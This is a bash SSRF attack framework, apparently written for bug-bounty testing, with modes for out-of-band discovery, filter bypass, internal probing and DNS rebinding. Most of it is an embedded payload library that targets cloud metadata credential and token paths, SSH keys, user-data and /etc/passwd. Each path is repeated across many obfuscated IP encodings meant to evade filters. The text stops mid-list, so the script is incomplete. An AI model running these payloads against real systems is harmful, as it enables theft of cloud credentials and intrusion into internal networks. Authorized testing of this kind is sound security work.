#!/usr/bin/env bash
# SSRF testing framework - fixed/staged rewrite of the user's second script.
# Intended for authorized security testing / bug bounty scope only.
# Ensure you place this script in a folder with a targets.txt file.
#
# Usage:
#   ./ssrf-framework.sh [mode] [request_delay_seconds]
#
# The second argument is the delay between EVERY request (not between targets).
#
# Modes:
#   discover   OOB GET/POST/JSON/header discovery across HTTP/HTTPS and alternate schemes (default)
#   bypass     URL parser/filter bypass tests
#   protocols  Focused non-HTTP scheme capability re-test against your canary
#   internal   Internal reachability checks (requires ACTIVE_PARAM or ACTIVE_HEADER,
#              unless FORCE_BROAD_INTERNAL=1)
#   rebind     Send requests to a DNS rebinding domain you control
#   timing     Baseline-vs-candidate timing comparison
#   payloads   Run the embedded 429-line payload library against a confirmed input
#   all        discover + bypass + timing, plus internal/payloads/rebind only
#              when explicitly configured
#
# Examples:
#   COLLABORATOR="abc123.oastify.com" ./ssrf-framework.sh discover
#   COLLABORATOR="abc123.oastify.com" ACTIVE_PARAM="url" ./ssrf-framework.sh internal
#   ACTIVE_HEADER="X-Callback-URL" ./ssrf-framework.sh internal
#   REBIND_DOMAIN="rebind.example.com" ACTIVE_PARAM="url" ./ssrf-framework.sh rebind
#   PROXY="" ./ssrf-framework.sh discover 1   # 1 second between every request
#   QUERY_MODE=replace COLLABORATOR="abc123.oastify.com" ./ssrf-framework.sh discover
#   QUERY_MODE=duplicate ACTIVE_PARAM="url" ./ssrf-framework.sh discover
#   QUERY_MODE=both ACTIVE_PARAM="url" ./ssrf-framework.sh discover
#   QUERY_MODE=both COLLABORATOR="abc123.oastify.com" ./ssrf-framework.sh discover
#   CUSTOM_HEADER="X-HackerOne-Researcher: dreamsoftragedy" COLLABORATOR="abc123.oastify.com" ./ssrf-framework.sh discover
#   CUSTOM_HEADER_FILE="client-headers.txt" COLLABORATOR="abc123.oastify.com" ./ssrf-framework.sh discover
#
# Notes:
# - Redirects are NOT followed. This avoids false OOB positives caused by local curl.
# - GET query handling supports replacement and HTTP parameter pollution via QUERY_MODE.
# - Form values are URL encoded with --data-urlencode.
# - Every OOB request gets a unique subdomain label for correlation.
# - Discovery automatically tests http, https, ftp, ldap, dict, gopher, redis, smtp and smtps by default.
# - Automated metadata tests in internal mode use non-secret identification endpoints only.
# - payloads mode contains the full user-supplied payload library, including sensitive metadata paths;
#   use it only where the program rules authorize that validation depth.

set -Eeuo pipefail

################################
# Configuration
################################
MODE="${1:-discover}"
TARGETS_FILE="${TARGETS_FILE:-targets.txt}"
COLLABORATOR="${COLLABORATOR:-burpcollaborator.net}"
REBIND_DOMAIN="${REBIND_DOMAIN:-}"
PROXY="${PROXY-http://127.0.0.1:8080}"
REQUEST_SLEEP="${2:-${REQUEST_SLEEP:-0.3}}"
TIMEOUT="${TIMEOUT:-20}"
CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-8}"
TIMING_RUNS="${TIMING_RUNS:-3}"
TIMING_DELTA="${TIMING_DELTA:-5.0}"
TIMING_BASELINE_URL="${TIMING_BASELINE_URL:-https://example.com/}"
# GET query behavior when the target already contains the parameter being tested:
#   replace   remove existing copies and add the payload once (default)
#   duplicate preserve existing query and append another copy (HPP)
#   both      send replacement and duplicate variants when they differ
QUERY_MODE="${QUERY_MODE:-replace}"
# Embedded payload-library behavior:
#   PAYLOAD_LEVEL=full  -> run every embedded entry (default in payloads mode)
#   PAYLOAD_LEVEL=safe  -> skip obvious credential/token/user-data/key retrieval paths
#   PAYLOAD_SCHEMES=auto -> HTTP+HTTPS for every entry, plus file:// for filesystem-like entries
#   PAYLOAD_SCHEMES=http,https,file -> explicit comma-separated scheme list
PAYLOAD_LEVEL="${PAYLOAD_LEVEL:-full}"
PAYLOAD_SCHEMES="${PAYLOAD_SCHEMES:-auto}"
PAYLOAD_LIMIT="${PAYLOAD_LIMIT:-0}"
FORCE_BROAD_PAYLOADS="${FORCE_BROAD_PAYLOADS:-0}"
ACTIVE_PARAM="${ACTIVE_PARAM:-}"
ACTIVE_HEADER="${ACTIVE_HEADER:-}"
FORCE_BROAD_INTERNAL="${FORCE_BROAD_INTERNAL:-0}"
LOG_DIR="${LOG_DIR:-ssrf-logs}"

REQUEST_LOG="$LOG_DIR/requests.tsv"
TIMING_LOG="$LOG_DIR/time_based_ssrf_hits.tsv"

USER_AGENT="${USER_AGENT:-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36}"

# Optional client/program identification headers.
# CUSTOM_HEADER accepts one complete header, e.g.:
#   CUSTOM_HEADER="X-HackerOne-Researcher: dreamsoftragedy"
# CUSTOM_HEADER_FILE accepts one complete header per line; blank lines and # comments are ignored.
CUSTOM_HEADER="${CUSTOM_HEADER:-}"
CUSTOM_HEADER_FILE="${CUSTOM_HEADER_FILE:-}"

# Discovery protocol set. By default, discovery automatically tests HTTP/HTTPS
# plus common alternate URL schemes against a unique OAST canary. Override with
# a comma-separated list, e.g. DISCOVERY_SCHEMES="http,https" for a lighter run.
DISCOVERY_SCHEMES_CSV="${DISCOVERY_SCHEMES:-http,https,ftp,ldap,dict,gopher,redis,smtp,smtps}"
IFS=',' read -r -a DISCOVERY_SCHEMES <<< "$DISCOVERY_SCHEMES_CSV"

case "$MODE" in
  discover|bypass|protocols|internal|rebind|timing|payloads|all) ;;
  *)
    echo "Error: unknown mode '$MODE'"
    echo "Valid modes: discover bypass protocols internal rebind timing payloads all"
    exit 2
    ;;
esac

case "$QUERY_MODE" in
  replace|duplicate|both) ;;
  *)
    echo "Error: QUERY_MODE must be replace, duplicate, or both"
    exit 2
    ;;
esac

case "$PAYLOAD_LEVEL" in
  safe|full) ;;
  *)
    echo "Error: PAYLOAD_LEVEL must be safe or full"
    exit 2
    ;;
esac

if ! [[ "$PAYLOAD_LIMIT" =~ ^[0-9]+$ ]]; then
  echo "Error: PAYLOAD_LIMIT must be a non-negative integer"
  exit 2
fi

if ! [[ "$REQUEST_SLEEP" =~ ^[0-9]+([.][0-9]+)?$ ]]; then
  echo "Error: request_delay_seconds must be a non-negative number"
  exit 2
fi

if [[ ! -f "$TARGETS_FILE" ]]; then
  echo "Error: targets file not found: $TARGETS_FILE"
  exit 2
fi

mkdir -p "$LOG_DIR"

if [[ ! -f "$REQUEST_LOG" ]]; then
  printf 'timestamp\ttarget\tmode\tvector\tname\tpayload\thttp_code\tsize\ttime_total\tlocation\n' > "$REQUEST_LOG"
fi
if [[ ! -f "$TIMING_LOG" ]]; then
  printf 'timestamp\ttarget\tvector\tname\tpayload\tbaseline_median\tcandidate_median\tdelta\n' > "$TIMING_LOG"
fi

################################
# Curl configuration
################################
CURL_COMMON=(
  --silent
  --show-error
  --globoff
  --max-time "$TIMEOUT"
  --connect-timeout "$CONNECT_TIMEOUT"
  --max-redirs 0
  -A "$USER_AGENT"
)

if [[ -n "$PROXY" ]]; then
  CURL_COMMON+=(--proxy "$PROXY" --insecure)
fi

# Apply client/program identification headers to every HTTP request, including
# discovery, bypass, internal, payload, rebind, protocol and timing modes.
if [[ -n "$CUSTOM_HEADER" ]]; then
  CURL_COMMON+=(-H "$CUSTOM_HEADER")
fi

if [[ -n "$CUSTOM_HEADER_FILE" ]]; then
  if [[ ! -f "$CUSTOM_HEADER_FILE" ]]; then
    echo "Error: custom header file not found: $CUSTOM_HEADER_FILE" >&2
    exit 2
  fi

  while IFS= read -r custom_header || [[ -n "$custom_header" ]]; do
    # Trim CR from Windows line endings.
    custom_header="${custom_header%$'\r'}"
    [[ -z "${custom_header//[[:space:]]/}" ]] && continue
    [[ "$custom_header" =~ ^[[:space:]]*# ]] && continue
    CURL_COMMON+=(-H "$custom_header")
  done < "$CUSTOM_HEADER_FILE"
fi

################################
# Input sets
################################
PARAMS=(
  url target dest redirect callback source uri endpoint fetch_url remote_url
  proxy_url webhook_url template_url config_url path continue window next data
  reference site html val validate domain return page feed host port to out view dir
)

# Discovery automatically tests HTTP/HTTPS plus alternate schemes listed in
# DISCOVERY_SCHEMES. The dedicated protocols mode remains available for focused
# re-testing of non-HTTP protocol behavior after a finding.
PROTOCOL_SCHEMES=("ftp" "ldap" "dict" "gopher" "redis" "smtp" "smtps")

URL_HEADERS=(
  X-Callback-URL
  X-Original-URL
  X-Rewrite-URL
  X-Forwarded-Url
  X-Request-Url
  X-Redirect
  X-Redirect-URL
  X-Proxy-Url
  Destination
  X-Destination
  Content-Location
  Webhook-URL
  X-Webhook-URL
  X-Api-Callback
  X-Callback
)

HOST_HEADERS=(
  Host
  X-Forwarded-Host
  X-Original-Host
  X-HTTP-Host-Override
  X-Host
  X-Proxy-Host
  X-Forwarded-Server
  Forwarded
)

# Hostnames/IP forms only. Paths are kept separate so :port is inserted correctly.
INTERNAL_HOSTS=(
  "127.0.0.1"
  "localhost"
  "10.0.0.1"
  "192.168.1.1"
  "172.16.0.1"
  "0.0.0.0"
  "[::1]"
  "0"
  "127.1"
  "127.0.1"
  "2130706433"
  "0x7f000001"
  "017700000001"
  "169.254.169.254"
  "192.0.0.192"
  "100.100.100.200"
  "kube-dns.kube-system.svc.cluster.local"
  "metadata.google.internal"
)

PORTS=(22 80 443 2375 3000 5000 6379 8080 9200)

# Non-secret identification endpoints only. Deliberately excludes credential/token paths.
SAFE_METADATA_URLS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/ami-id"
  "http://169.254.169.254/latest/meta-data/hostname"
  "http://169.254.169.254/latest/dynamic/instance-identity/document"
  "http://169.254.169.254/metadata/v1/"
  "http://169.254.169.254/metadata/v1/id"
  "http://169.254.169.254/metadata/v1/hostname"
  "http://169.254.169.254/metadata/v1/region"
  "http://100.100.100.200/latest/meta-data/instance-id"
  "http://100.100.100.200/latest/meta-data/image-id"
  "http://metadata.google.internal/computeMetadata/v1/instance/hostname"
  "http://metadata.google.internal/computeMetadata/v1/instance/id"
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"
  "http://192.0.0.192/latest/meta-data/"
)

TIME_PAYLOADS=(
  "http://127.0.0.1:81/"
  "http://10.255.255.1/"
  "http://169.254.169.254:81/"
  "http://metadata.google.internal:81/"
  "http://[::1]:81/"
)

################################
# Embedded full payload library
################################
# Source: user's payload-without-schemes-2.txt (embedded so the master script is standalone).
# Do not edit the here-doc delimiter. Entries are read literally, one per line.
embedded_payloads() {
  cat <<'__SSRF_EMBEDDED_PAYLOADS__'
127.0.0.1:80
127.0.0.1:443
127.0.0.1:22
0.0.0.0:80
0.0.0.0:443
0.0.0.0:22
localhost:80
localhost:443
localhost:22
127.0.0.1/
localhost/
0000::1:80/
0000::1:25/
0000::1:22/
0000::1:3128/
[::]:80/
[::]:25/
[::]:22/
[::]:3128/
127.127.127.127
127.0.1.3
127.0.0.0
0177.0.0.1/
2130706433/
3232235521/
3232235777/
[0:0:0:0:0:ffff:127.0.0.1]
localhost:+11211aaa
localhost:00011211aaaa
0/
127.1
127.0.1
127.1.1.1:80\@127.2.2.2:80/
127.1.1.1:80\@@127.2.2.2:80/
127.1.1.1:80:\@@127.2.2.2:80/
127.1.1.1:80#\@127.2.2.2:80/
etc/passwd
/etc/passwd
\/\/etc/passwd
169.254.169.254
metadata.nicob.net/
169.254.169.254.xip.io/
1ynrnhl.xip.io/
www.owasp.org.1ynrnhl.xip.io/
425.510.425.510/
2852039166/
7147006462/
0xA9.0xFE.0xA9.0xFE/
0xA9FEA9FE/
0x41414141A9FEA9FE/
0251.0376.0251.0376/
0251.00376.000251.0000376/
169.254.169.254/latest/user-data
169.254.169.254/latest/user-data/iam/security-credentials/admin
169.254.169.254/latest/meta-data/
169.254.169.254/latest/meta-data/iam/security-credentials/admin
169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
169.254.169.254/latest/meta-data/ami-id
169.254.169.254/latest/meta-data/reservation-id
169.254.169.254/latest/meta-data/hostname
169.254.169.254/latest/meta-data/public-keys/
169.254.169.254/latest/meta-data/public-keys/0/openssh-key
169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
169.254.169.254/latest/meta-data/iam/security-credentials/dummy
169.254.169.254/latest/meta-data/iam/security-credentials/s3access
169.254.169.254/latest/dynamic/instance-identity/document
169.254.169.254/metadata/v1/maintenance
169.254.169.254/latest/dynamic/instance-identity/document
169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
169.254.169.254/computeMetadata/v1/
metadata.google.internal/computeMetadata/v1/
metadata/computeMetadata/v1/
metadata.google.internal/computeMetadata/v1/instance/hostname
metadata.google.internal/computeMetadata/v1/instance/id
metadata.google.internal/computeMetadata/v1/project/project-id
metadata.google.internal/computeMetadata/v1beta1/
metadata.google.internal/computeMetadata/v1beta1/?recursive=true
metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
169.254.169.254/metadata/v1.json
169.254.169.254/metadata/v1/
169.254.169.254/metadata/v1/id
169.254.169.254/metadata/v1/user-data
169.254.169.254/metadata/v1/hostname
169.254.169.254/metadata/v1/region
169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
169.254.169.254/metadata/instance?api-version=2017-04-02
169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
169.254.169.254/openstack
169.254.169.254/2009-04-04/meta-data/
192.0.0.192/latest/
192.0.0.192/latest/user-data/
192.0.0.192/latest/meta-data/
192.0.0.192/latest/attributes
100.100.100.200/latest/meta-data/
100.100.100.200/latest/meta-data/instance-id
100.100.100.200/latest/meta-data/image-id
127.0.0.1:2375/v1.24/containers/json
127.0.0.1:2379/version
127.0.0.1:2379/v2/keys/?recursive=true
2852039166/latest/user-data
2852039166/latest/user-data/iam/security-credentials/admin
2852039166/latest/meta-data/
2852039166/latest/meta-data/iam/security-credentials/admin
2852039166/latest/meta-data/iam/security-credentials/PhotonInstance
2852039166/latest/meta-data/ami-id
2852039166/latest/meta-data/reservation-id
2852039166/latest/meta-data/hostname
2852039166/latest/meta-data/public-keys/
2852039166/latest/meta-data/public-keys/0/openssh-key
2852039166/latest/meta-data/public-keys/[ID]/openssh-key
2852039166/latest/meta-data/iam/security-credentials/dummy
2852039166/latest/meta-data/iam/security-credentials/s3access
2852039166/latest/dynamic/instance-identity/document
2852039166/metadata/v1/maintenance
2852039166/latest/dynamic/instance-identity/document
2852039166/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
2852039166/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
2852039166/computeMetadata/v1/
0xa9fea9fe/latest/user-data
0xa9fea9fe/latest/user-data/iam/security-credentials/admin
0xa9fea9fe/latest/meta-data/
0xa9fea9fe/latest/meta-data/iam/security-credentials/admin
0xa9fea9fe/latest/meta-data/iam/security-credentials/PhotonInstance
0xa9fea9fe/latest/meta-data/ami-id
0xa9fea9fe/latest/meta-data/reservation-id
0xa9fea9fe/latest/meta-data/hostname
0xa9fea9fe/latest/meta-data/public-keys/
0xa9fea9fe/latest/meta-data/public-keys/0/openssh-key
0xa9fea9fe/latest/meta-data/public-keys/[ID]/openssh-key
0xa9fea9fe/latest/meta-data/iam/security-credentials/dummy
0xa9fea9fe/latest/meta-data/iam/security-credentials/s3access
0xa9fea9fe/latest/dynamic/instance-identity/document
0xa9fea9fe/metadata/v1/maintenance
0xa9fea9fe/latest/dynamic/instance-identity/document
0xa9fea9fe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0xa9fea9fe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0xa9fea9fe/computeMetadata/v1/
025177524776/latest/user-data
025177524776/latest/user-data/iam/security-credentials/admin
025177524776/latest/meta-data/
025177524776/latest/meta-data/iam/security-credentials/admin
025177524776/latest/meta-data/iam/security-credentials/PhotonInstance
025177524776/latest/meta-data/ami-id
025177524776/latest/meta-data/reservation-id
025177524776/latest/meta-data/hostname
025177524776/latest/meta-data/public-keys/
025177524776/latest/meta-data/public-keys/0/openssh-key
025177524776/latest/meta-data/public-keys/[ID]/openssh-key
025177524776/latest/meta-data/iam/security-credentials/dummy
025177524776/latest/meta-data/iam/security-credentials/s3access
025177524776/latest/dynamic/instance-identity/document
025177524776/metadata/v1/maintenance
025177524776/latest/dynamic/instance-identity/document
025177524776/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
025177524776/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
025177524776/computeMetadata/v1/
0xa9.0xfe.0xa9.0xfe/latest/user-data
0xa9.0xfe.0xa9.0xfe/latest/user-data/iam/security-credentials/admin
0xa9.0xfe.0xa9.0xfe/latest/meta-data/
0xa9.0xfe.0xa9.0xfe/latest/meta-data/iam/security-credentials/admin
0xa9.0xfe.0xa9.0xfe/latest/meta-data/iam/security-credentials/PhotonInstance
0xa9.0xfe.0xa9.0xfe/latest/meta-data/ami-id
0xa9.0xfe.0xa9.0xfe/latest/meta-data/reservation-id
0xa9.0xfe.0xa9.0xfe/latest/meta-data/hostname
0xa9.0xfe.0xa9.0xfe/latest/meta-data/public-keys/
0xa9.0xfe.0xa9.0xfe/latest/meta-data/public-keys/0/openssh-key
0xa9.0xfe.0xa9.0xfe/latest/meta-data/public-keys/[ID]/openssh-key
0xa9.0xfe.0xa9.0xfe/latest/meta-data/iam/security-credentials/dummy
0xa9.0xfe.0xa9.0xfe/latest/meta-data/iam/security-credentials/s3access
0xa9.0xfe.0xa9.0xfe/latest/dynamic/instance-identity/document
0xa9.0xfe.0xa9.0xfe/metadata/v1/maintenance
0xa9.0xfe.0xa9.0xfe/latest/dynamic/instance-identity/document
0xa9.0xfe.0xa9.0xfe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0xa9.0xfe.0xa9.0xfe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0xa9.0xfe.0xa9.0xfe/computeMetadata/v1/
0251.0376.0251.0376/latest/user-data
0251.0376.0251.0376/latest/user-data/iam/security-credentials/admin
0251.0376.0251.0376/latest/meta-data/
0251.0376.0251.0376/latest/meta-data/iam/security-credentials/admin
0251.0376.0251.0376/latest/meta-data/iam/security-credentials/PhotonInstance
0251.0376.0251.0376/latest/meta-data/ami-id
0251.0376.0251.0376/latest/meta-data/reservation-id
0251.0376.0251.0376/latest/meta-data/hostname
0251.0376.0251.0376/latest/meta-data/public-keys/
0251.0376.0251.0376/latest/meta-data/public-keys/0/openssh-key
0251.0376.0251.0376/latest/meta-data/public-keys/[ID]/openssh-key
0251.0376.0251.0376/latest/meta-data/iam/security-credentials/dummy
0251.0376.0251.0376/latest/meta-data/iam/security-credentials/s3access
0251.0376.0251.0376/latest/dynamic/instance-identity/document
0251.0376.0251.0376/metadata/v1/maintenance
0251.0376.0251.0376/latest/dynamic/instance-identity/document
0251.0376.0251.0376/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0251.0376.0251.0376/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0251.0376.0251.0376/computeMetadata/v1/
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/user-data
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/user-data/iam/security-credentials/admin
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/iam/security-credentials/admin
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/iam/security-credentials/PhotonInstance
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/ami-id
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/reservation-id
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/hostname
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/public-keys/
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/public-keys/0/openssh-key
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/public-keys/[ID]/openssh-key
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/iam/security-credentials/dummy
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/iam/security-credentials/s3access
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/dynamic/instance-identity/document
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/metadata/v1/maintenance
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/dynamic/instance-identity/document
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
 0x00000000000000a9.0x00000fe.0x0a9.0x00000fe/computeMetadata/v1/
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/user-data
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/user-data/iam/security-credentials/admin
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/iam/security-credentials/admin
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/iam/security-credentials/PhotonInstance
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/ami-id
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/reservation-id
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/hostname
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/public-keys/
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/public-keys/0/openssh-key
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/public-keys/[ID]/openssh-key
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/iam/security-credentials/dummy
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/iam/security-credentials/s3access
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/dynamic/instance-identity/document
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/metadata/v1/maintenance
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/dynamic/instance-identity/document
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
00000000000000251.000000000000000000000000000000376.000000000000000000000251.0000000000000000000000376/computeMetadata/v1/
169.0xfe.169.0xfe/latest/user-data
169.0xfe.169.0xfe/latest/user-data/iam/security-credentials/admin
169.0xfe.169.0xfe/latest/meta-data/
169.0xfe.169.0xfe/latest/meta-data/iam/security-credentials/admin
169.0xfe.169.0xfe/latest/meta-data/iam/security-credentials/PhotonInstance
169.0xfe.169.0xfe/latest/meta-data/ami-id
169.0xfe.169.0xfe/latest/meta-data/reservation-id
169.0xfe.169.0xfe/latest/meta-data/hostname
169.0xfe.169.0xfe/latest/meta-data/public-keys/
169.0xfe.169.0xfe/latest/meta-data/public-keys/0/openssh-key
169.0xfe.169.0xfe/latest/meta-data/public-keys/[ID]/openssh-key
169.0xfe.169.0xfe/latest/meta-data/iam/security-credentials/dummy
169.0xfe.169.0xfe/latest/meta-data/iam/security-credentials/s3access
169.0xfe.169.0xfe/latest/dynamic/instance-identity/document
169.0xfe.169.0xfe/metadata/v1/maintenance
169.0xfe.169.0xfe/latest/dynamic/instance-identity/document
169.0xfe.169.0xfe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
169.0xfe.169.0xfe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
169.0xfe.169.0xfe/computeMetadata/v1/
0251.0xfe.0xa9.0376/latest/user-data
0251.0xfe.0xa9.0376/latest/user-data/iam/security-credentials/admin
0251.0xfe.0xa9.0376/latest/meta-data/
0251.0xfe.0xa9.0376/latest/meta-data/iam/security-credentials/admin
0251.0xfe.0xa9.0376/latest/meta-data/iam/security-credentials/PhotonInstance
0251.0xfe.0xa9.0376/latest/meta-data/ami-id
0251.0xfe.0xa9.0376/latest/meta-data/reservation-id
0251.0xfe.0xa9.0376/latest/meta-data/hostname
0251.0xfe.0xa9.0376/latest/meta-data/public-keys/
0251.0xfe.0xa9.0376/latest/meta-data/public-keys/0/openssh-key
0251.0xfe.0xa9.0376/latest/meta-data/public-keys/[ID]/openssh-key
0251.0xfe.0xa9.0376/latest/meta-data/iam/security-credentials/dummy
0251.0xfe.0xa9.0376/latest/meta-data/iam/security-credentials/s3access
0251.0xfe.0xa9.0376/latest/dynamic/instance-identity/document
0251.0xfe.0xa9.0376/metadata/v1/maintenance
0251.0xfe.0xa9.0376/latest/dynamic/instance-identity/document
0251.0xfe.0xa9.0376/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0251.0xfe.0xa9.0376/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0251.0xfe.0xa9.0376/computeMetadata/v1/
0xa9.0376.0251.0376/latest/user-data
0xa9.0376.0251.0376/latest/user-data/iam/security-credentials/admin
0xa9.0376.0251.0376/latest/meta-data/
0xa9.0376.0251.0376/latest/meta-data/iam/security-credentials/admin
0xa9.0376.0251.0376/latest/meta-data/iam/security-credentials/PhotonInstance
0xa9.0376.0251.0376/latest/meta-data/ami-id
0xa9.0376.0251.0376/latest/meta-data/reservation-id
0xa9.0376.0251.0376/latest/meta-data/hostname
0xa9.0376.0251.0376/latest/meta-data/public-keys/
0xa9.0376.0251.0376/latest/meta-data/public-keys/0/openssh-key
0xa9.0376.0251.0376/latest/meta-data/public-keys/[ID]/openssh-key
0xa9.0376.0251.0376/latest/meta-data/iam/security-credentials/dummy
0xa9.0376.0251.0376/latest/meta-data/iam/security-credentials/s3access
0xa9.0376.0251.0376/latest/dynamic/instance-identity/document
0xa9.0376.0251.0376/metadata/v1/maintenance
0xa9.0376.0251.0376/latest/dynamic/instance-identity/document
0xa9.0376.0251.0376/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0xa9.0376.0251.0376/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0xa9.0376.0251.0376/computeMetadata/v1/
169.0376.169.0xfe/latest/user-data
169.0376.169.0xfe/latest/user-data/iam/security-credentials/admin
169.0376.169.0xfe/latest/meta-data/
169.0376.169.0xfe/latest/meta-data/iam/security-credentials/admin
169.0376.169.0xfe/latest/meta-data/iam/security-credentials/PhotonInstance
169.0376.169.0xfe/latest/meta-data/ami-id
169.0376.169.0xfe/latest/meta-data/reservation-id
169.0376.169.0xfe/latest/meta-data/hostname
169.0376.169.0xfe/latest/meta-data/public-keys/
169.0376.169.0xfe/latest/meta-data/public-keys/0/openssh-key
169.0376.169.0xfe/latest/meta-data/public-keys/[ID]/openssh-key
169.0376.169.0xfe/latest/meta-data/iam/security-credentials/dummy
169.0376.169.0xfe/latest/meta-data/iam/security-credentials/s3access
169.0376.169.0xfe/latest/dynamic/instance-identity/document
169.0376.169.0xfe/metadata/v1/maintenance
169.0376.169.0xfe/latest/dynamic/instance-identity/document
169.0376.169.0xfe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
169.0376.169.0xfe/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
169.0376.169.0xfe/computeMetadata/v1/
0xa9.0376.0xa9.0376/latest/user-data
0xa9.0376.0xa9.0376/latest/user-data/iam/security-credentials/admin
0xa9.0376.0xa9.0376/latest/meta-data/
0xa9.0376.0xa9.0376/latest/meta-data/iam/security-credentials/admin
0xa9.0376.0xa9.0376/latest/meta-data/iam/security-credentials/PhotonInstance
0xa9.0376.0xa9.0376/latest/meta-data/ami-id
0xa9.0376.0xa9.0376/latest/meta-data/reservation-id
0xa9.0376.0xa9.0376/latest/meta-data/hostname
0xa9.0376.0xa9.0376/latest/meta-data/public-keys/
0xa9.0376.0xa9.0376/latest/meta-data/public-keys/0/openssh-key
0xa9.0376.0xa9.0376/latest/meta-data/public-keys/[ID]/openssh-key
0xa9.0376.0xa9.0376/latest/meta-data/iam/security-credentials/dummy
0xa9.0376.0xa9.0376/latest/meta-data/iam/security-credentials/s3access
0xa9.0376.0xa9.0376/latest/dynamic/instance-identity/document
0xa9.0376.0xa9.0376/metadata/v1/maintenance
0xa9.0376.0xa9.0376/latest/dynamic/instance-identity/document
0xa9.0376.0xa9.0376/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0xa9.0376.0xa9.0376/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
0xa9.0376.0xa9.0376/computeMetadata/v1/
169.0x0000000000000fe.169.0x000000fe/latest/user-data
